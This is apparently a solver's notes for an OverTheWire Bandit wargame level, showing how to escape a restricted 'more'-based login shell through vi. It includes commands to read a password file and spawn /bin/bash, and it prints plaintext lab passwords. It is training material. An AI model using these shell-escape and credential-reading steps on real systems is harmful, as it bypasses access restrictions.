# Bandit Level 25 → Level 26

## Level Goal

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

## Commands you may need to solve this level

ssh, cat, more, vi, ls, id, pwd



```
ssh bandit25@bandit.labs.overthewire.org -p 2220
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

ls #bandit26.sshkey

cat /etc/passwd|grep bandit26
#bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

cat /usr/bin/showtext
/*
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
*/

缩小终端窗口以暂时中断more命令
ssh -i bandit26.sshkey bandit26@localhost
按v调用vi编辑器

:r /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
:set shell=/bin/bash
:sh
Good job getting a shell!
```

